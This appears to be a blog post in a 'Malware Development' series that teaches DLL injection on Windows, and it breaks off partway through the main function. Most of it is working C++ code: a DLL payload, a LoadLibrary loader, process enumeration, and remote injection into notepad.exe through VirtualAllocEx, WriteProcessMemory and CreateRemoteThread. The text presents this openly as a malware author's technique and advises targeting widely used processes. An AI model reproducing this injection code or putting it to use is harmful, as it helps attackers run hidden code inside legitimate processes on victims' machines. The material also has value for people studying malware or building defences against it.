# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="local-dll-injection">Local DLL Injection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#local-dll-injection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>
<h2 id="creating-dll">Creating DLL<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#creating-dll" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
<p>First we need to prepare a DLL, we can embed our code directly inside the DLL main function and we have four choices to choose from:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
 <span class="p">{</span>
 <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
 <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
 <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
 <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
     <span class="k">break</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div></div>
<p>Form now we will choose to run the code once the DLL is attached to a process.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"pch.h"</span><span class="cp">
</span>
<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
                       <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
                       <span class="n">LPVOID</span> <span class="n">lpReserved</span>
                     <span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>

        <span class="n">MessageBox</span><span class="p">(</span>  <span class="nb">NULL</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="s">L"You have been HACKED!"</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="s">L"Details"</span><span class="p">,</span><span class="n">MB_ICONWARNING</span> <span class="p">);</span>    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>

    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Build the project and let’s create another project to code our loader this time</p>

<h2 id="loader">Loader<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#loader" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Before we start any coding, I want to talk briefly on the technique itself, It is a very common one and still used in the wild, because of many reasons</p>

<p>Most malware families have multiple stages, and you can’t nowadays find a malware that is executing its functionality in one stage.</p>

<p>DLLs can be used easily as a second, third, fourth stage, and since they are independent files, they can easily be modified without modifying the loader itself, and that’s something very practical for a malware author.</p>

<p>The process of loading a DLL locally locally is as follows:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">Id</span> <span class="o">=</span> <span class="n">GetCurrentProcessId</span><span class="p">();</span>
  <span class="n">CHAR</span> <span class="n">path</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Dll1.dll"</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[!] LoadLibraryA Failed With Error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> 
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Injected to process %d ! </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">Id</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<p><strong>GetCurrentProcessId()</strong> is just for the purose of getting the ID of the process, incase you need it later or want to send it anywhere, but it doesn’t really affect the injection routine.</p>

<p>All the injection happens with <strong>LoadLibraryA()</strong> API call which is an API that’ll take the first argument which will be the path to our DLL (in the above case the DLL was already inside my project’s file so I didn’t have to write the full path) and attach it to the process.</p>

<p>And remember when we created the DLL, we placed our code after the case <strong>DLL_PROCESS_ATTACH</strong>, build and run to see the code triggering.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/4-0.png" alt="P1"></p>

<h1 id="remote-dll-injection">Remote DLL Injection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#remote-dll-injection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>
<p>Now this is all about local injection, but an attacker won’t benefit that much if he injected his DLL inside his loader’s process, doesn’t make sense.</p>

<p>The way this happens in real world is injecting into another’s process’s address space, so that the injected DLL is part of the legitimate process.</p>

<p>Remote DLL Injection happens in steps:</p>

<ul>
  <li>retrieve a handle to the targeted process</li>
  <li>Writes his DLL’s path inside the targeted process memory</li>
  <li>Invoke LoadLibrary remotly to load his DLL into that process.</li>
</ul>

<h2 id="enumerating-processes">Enumerating processes<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#enumerating-processes" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>As we have a specific targeted process, we will need to do a simple enumeration in order to see if the process is running and if that was the case we retrieve a handle to it along with its PID.</p>

<blockquote>
  <p>Always target a widely used process</p>
</blockquote>

<p>The API <strong>CreateToolhelp32Snapshot()</strong> will help us doing this, it is used to create a snapshot of the current state of the system or a specific process.</p>

<p>Using this function to snapshot the current processes then we can navigate them and validate each one if it is our target or not.</p>

<p>For the navigation we will be using <strong>Process32First()</strong> and <strong>Process32Next().</strong></p>

<h2 id="snapshotting-the-processes">Snapshotting the processes<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#snapshotting-the-processes" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hSnapShot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">TH32CS_SNAPPROCESS</code>  specifies that the snapshot to be created should include information about all processes currently running on the system.</p>

<h2 id="navigating-through-the-processes">Navigating through the processes<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#navigating-through-the-processes" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Next we need to loop through the snapshot processes:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PROCESSENTRY32</span> <span class="n">Proc</span><span class="p">;</span>
<span class="n">Proc</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapShot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Proc</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Process32First Failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">do</span> <span class="p">{</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">Proc</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">pProcessName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="o">*</span><span class="n">pProcessID</span> <span class="o">=</span> <span class="n">Proc</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>

      <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">*</span><span class="n">pProcessID</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"OpenProcess failed with Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapShot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Proc</span><span class="p">));</span>
</code></pre></div></div>

<p>If <code class="language-plaintext highlighter-rouge">Process32First</code> succeeds, it returns <code class="language-plaintext highlighter-rouge">TRUE</code>, and the <code class="language-plaintext highlighter-rouge">PROCESSENTRY32</code> structure passed to it is filled with information about the first process in the snapshot.</p>

<p><code class="language-plaintext highlighter-rouge">Proc</code> is a variable from the type <code class="language-plaintext highlighter-rouge">PROCESSENTRY32</code> indeed.</p>

<p><code class="language-plaintext highlighter-rouge">pProcessName</code> here is a parameter that we will pass to our process enumeration function, and it will be compared with <code class="language-plaintext highlighter-rouge">Proc.szExeFile</code> and szExeFile is the name of the exe file of that specific process, and this element is an element of the structure<code class="language-plaintext highlighter-rouge">PROCESSENTRY32</code>.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tagPROCESSENTRY32</span> <span class="p">{</span>
  <span class="n">DWORD</span>     <span class="n">dwSize</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">cntUsage</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">th32ProcessID</span><span class="p">;</span>
  <span class="n">ULONG_PTR</span> <span class="n">th32DefaultHeapID</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">th32ModuleID</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">cntThreads</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">th32ParentProcessID</span><span class="p">;</span>
  <span class="n">LONG</span>      <span class="n">pcPriClassBase</span><span class="p">;</span>
  <span class="n">DWORD</span>     <span class="n">dwFlags</span><span class="p">;</span>
  <span class="n">CHAR</span>      <span class="o">**</span><span class="n">szExeFile</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span><span class="o">**</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PROCESSENTRY32</span><span class="p">;</span>
</code></pre></div></div>
<p>If a match was found the <code class="language-plaintext highlighter-rouge">pProcessID</code> (which is an OUT parameter passed the function) will be set to the value  <code class="language-plaintext highlighter-rouge">Proc.th32ProcessID</code> the target process ID.</p>

<p>And <strong>OpenProcess()</strong> will be called to retrieve a handle to the target process.</p>

<p>If a match wasn’t found, the loop simple continues and <strong>Process32Next()</strong> is called to check the next process entry in the snapshot and so.</p>

<p>Code of process enumeration function:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">GetRemoteProcessHandle</span><span class="p">(</span><span class="n">IN</span> <span class="n">LPWSTR</span> <span class="n">pProcessName</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">pProcessID</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">PROCESSENTRY32</span> <span class="n">Proc</span><span class="p">;</span>
  <span class="n">Proc</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

  <span class="n">HANDLE</span> <span class="n">hSnapShot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hSnapShot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Cannot take snapshot: Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapShot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Proc</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Process32First Failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">do</span> <span class="p">{</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">Proc</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">pProcessName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="o">*</span><span class="n">pProcessID</span> <span class="o">=</span> <span class="n">Proc</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>

      <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">*</span><span class="n">pProcessID</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"OpenProcess failed with Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapShot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Proc</span><span class="p">));</span>
  
  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="resolving-loadlibrary-address-within-the-targeted-process-memory">Resolving LoadLibrary address within the targeted process memory<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#resolving-loadlibrary-address-within-the-targeted-process-memory" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>After we have finished the process enumeration part, we assume now that we got the handle and PID of our target, and we need to start implementing the injection logic.</p>

<p>We will need to call LoadLibrary in a slightly different way than we were doing before:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">pLoadLibrary</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryW"</span><span class="p">);</span>
</code></pre></div></div>

<p>This line of code is all about getting the address of <strong>LoadLibraryW()</strong> API , we are obtaining the address of the API dynamically,  and that’s because we don’t have acccess to the target’s process space since we are doing this from our own loader’s process space.</p>

<p>That’s why we can’t directly invoke it,  <strong>GetProcAddress()</strong> allows us to do this by passing a handle to <strong>kernel32.dll</strong> which is the place where the function in the second parameter <strong>LoadLibraryW</strong> is defined.</p>

<h2 id="allocating-memory-and-writing-dlls-path">Allocating memory and writing DLL’s path<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#allocating-memory-and-writing-dlls-path" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>After we obtain the handle to the API we will allocate a memory region, to be writeable mainly, we don’t need any execution permissions here, and write our DLL’s path to that region:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">dwSizeToWrite</span> <span class="o">=</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">DllName</span><span class="p">)</span> <span class="o">*</span> <span class="nf">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>

<span class="n">LPVOID</span> <span class="n">pMemory</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSizeToWrite</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">pMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error allocating memory %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">SIZE_T</span> <span class="n">lpNumberofBytesWritten</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pMemory</span><span class="p">,</span> <span class="n">DllName</span><span class="p">,</span> <span class="n">dwSizeToWrite</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpNumberofBytesWritten</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed Writing to memory, error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>Always remember that we are doing this on another’s process memory, so we can’t use <strong>VirtualAlloc()</strong>, instead we have used <strong>VirtualAllocEx()</strong> which is used to allocate memory within the address space of a specified process. And it is particularly useful in scenarios where you need to allocate memory in a remote process.</p>

<p>As I said, we only need <strong>PAGE_READWRITE</strong> permissions.</p>

<p>Now after the write operation we have everything we need to complete the injection, the last step will be invoking the LoadLibraryW we resolved before and giving it the address of our allocated memory which holds the DLL path.</p>

<p>However also a good way to do this is to use <strong>CreateRemoteThread()</strong> API.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
<span class="p">);</span>
</code></pre></div></div>
<p><strong>CreateRemoteThread()</strong> is used to create a thread in the virtual address space of a remote process. It’s a fundamental function for injecting code into another process.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
  
<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pLoadLibrary</span><span class="p">,</span> <span class="n">pMemory</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>We pass LoadLibrary pointer so that the thread can start from there, same as calling the function, And <code class="language-plaintext highlighter-rouge">lpParameter</code> will be the address of our allocated region that holds DLL’s path.</p>

<blockquote>
  <p>Note: The process handle and DLL path are passed to the function as parameters</p>
</blockquote>

<p>Complete code ofthe injection function:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">InjectDll</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span><span class="n">IN</span> <span class="n">LPWSTR</span> <span class="n">DllName</span><span class="p">)</span> <span class="p">{</span>

<span class="n">LPVOID</span> <span class="n">pLoadLibrary</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryW"</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">pLoadLibrary</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"can't obtain handle to LoadLibrary, error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">DWORD</span> <span class="n">dwSizeToWrite</span> <span class="o">=</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">DllName</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>

  <span class="n">LPVOID</span> <span class="n">pMemory</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSizeToWrite</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">pMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error allocating memory %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">SIZE_T</span> <span class="n">lpNumberofBytesWritten</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pMemory</span><span class="p">,</span> <span class="n">DllName</span><span class="p">,</span> <span class="n">dwSizeToWrite</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpNumberofBytesWritten</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed Writing to memory, error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pLoadLibrary</span><span class="p">,</span> <span class="n">pMemory</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Cannot start the remote thread, error %s"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Main function:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
  
<span class="p">{</span>
  <span class="n">LPWSTR</span> <span class="n">ProcessName</span><span class="p">;</span>

  <span class="n">ProcessName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="n">wcslen</span><span class="p">(</span><span class="s">L"notepad.exe"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
  <span class="n">wcscpy</span><span class="p">(</span><span class="n">ProcessName</span><span class="p">,</span> <span class="s">L"notepad.exe"</span><span class="p">);</span>

  <span class="n">DWORD</span><span class="o">*</span> <span class="n">ProcID</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));;</span>

  <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span> <span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">GetRemoteProcessHandle</span><span class="p">(</span><span class="n">ProcessName</span><span class="p">,</span> <span class="n">ProcID</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">)</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"Cannot find notepad.exe"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
